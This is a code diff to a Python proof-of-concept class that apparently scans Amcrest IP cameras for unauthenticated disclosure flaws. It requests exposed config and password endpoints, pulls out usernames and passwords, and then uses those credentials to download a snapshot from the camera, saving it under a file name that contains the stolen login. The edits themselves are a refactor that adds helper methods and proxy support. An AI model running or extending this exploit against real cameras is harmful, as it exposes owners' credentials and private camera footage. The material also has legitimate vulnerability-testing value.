@@ -27,16 +27,14 @@ class AmcrestDisclosure(POCTemplate):
 
     def verify(self, ip, port=80):
         """Check for unauthenticated access to webCapsConfig"""
-        headers = {
-            'User-Agent': self.config.user_agent,
-            'Connection': 'close',
-        }
+        headers = self._get_headers()
+        proxies = self._get_proxies()
 
         # Test unauthenticated endpoints
         test_urls = [
-            (f"http://{ip}:{port}/web_caps/webCapsConfig", 'table.General.MachineName'),
-            (f"http://{ip}:{port}/current_config/passwd", 'Password'),
-            (f"http://{ip}:{port}/current_config/Account1", 'Username'),
+            (self._get_url(ip, port, '/web_caps/webCapsConfig'), 'table.General.MachineName'),
+            (self._get_url(ip, port, '/current_config/passwd'), 'Password'),
+            (self._get_url(ip, port, '/current_config/Account1'), 'Username'),
         ]
 
         for url, indicator in test_urls:
@@ -46,7 +44,8 @@ class AmcrestDisclosure(POCTemplate):
                     headers=headers,
                     verify=False,
                     timeout=self.config.timeout,
-                    allow_redirects=False
+                    allow_redirects=False,
+                    proxies=proxies
                 )
                 if r.status_code == 200 and indicator in r.text:
                     # Try to extract credentials if present
@@ -69,7 +68,7 @@ class AmcrestDisclosure(POCTemplate):
         from requests.auth import HTTPDigestAuth
         if user not in ('disclosed', 'N/A') and password not in ('disclosed', 'N/A'):
             img_file_name = f"{ip}-{port}-{user}-{password}.jpg"
-            url = f"http://{ip}:{port}/cgi-bin/snapshot.cgi"
+            url = self._get_url(ip, port, '/cgi-bin/snapshot.cgi')
             return self._snapshot(url, img_file_name, HTTPDigestAuth(user, password))
         return 0
 
